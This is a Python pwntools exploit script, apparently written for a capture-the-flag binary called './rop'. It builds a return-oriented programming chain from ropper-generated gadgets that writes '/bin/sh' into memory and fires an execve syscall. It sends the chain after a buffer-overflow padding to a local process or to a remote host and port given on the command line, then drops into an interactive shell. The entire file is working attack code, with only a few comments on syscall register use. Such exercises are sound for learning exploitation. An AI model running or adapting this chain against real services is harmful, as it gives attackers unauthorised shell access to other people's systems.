#!/usr/bin/env python
# Generated by ropper ropchain generator #

from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./rop")
    if args.GDB:
        gdb.attach(r,'b *0x806f430')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)

IMAGE_BASE = 0x08048000
rebase = lambda x : p32(x + IMAGE_BASE)

padding = b'A' * 16
rop = b''

rop += rebase(0x00070016) # 0x080b8016: pop eax; ret;
rop += b'//bi'
rop += rebase(0x00026cda) # 0x0806ecda: pop edx; ret;
rop += rebase(0x000a2060)
rop += rebase(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret;

rop += rebase(0x00070016) # 0x080b8016: pop eax; ret;
rop += b'n/sh'
rop += rebase(0x00026cda) # 0x0806ecda: pop edx; ret;
rop += rebase(0x000a2064)
rop += rebase(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret;

rop += rebase(0x00070016) # 0x080b8016: pop eax; ret;
rop += p32(0x00000000)
rop += rebase(0x00026cda) # 0x0806ecda: pop edx; ret;
rop += rebase(0x000a2068)
rop += rebase(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret;


# Notice that in normal execve we can use /bin/sh, NULL, NULL
# But if we syscall we must use /bin/sh, addr poiting to null, addr poiting to null
# Lesson learned
# execve syscall still use register as arg (%eax arg0(%ebx) arg1(%ecx) arg2(%edx))
rop += rebase(0x000001c9) # 0x080481c9: pop ebx; ret;
rop += rebase(0x000a2060)
rop += rebase(0x00096769) # 0x080de769: pop ecx; ret;
rop += rebase(0x000a2068)
rop += rebase(0x00026cda) # 0x0806ecda: pop edx; ret;
rop += rebase(0x000a2068)
rop += rebase(0x00070016) # 0x080b8016: pop eax; ret;
rop += p32(0x0000000b)
rop += rebase(0x00027430) # 0x0806f430: int 0x80; ret;
r.sendline(padding + rop)
r.interactive()


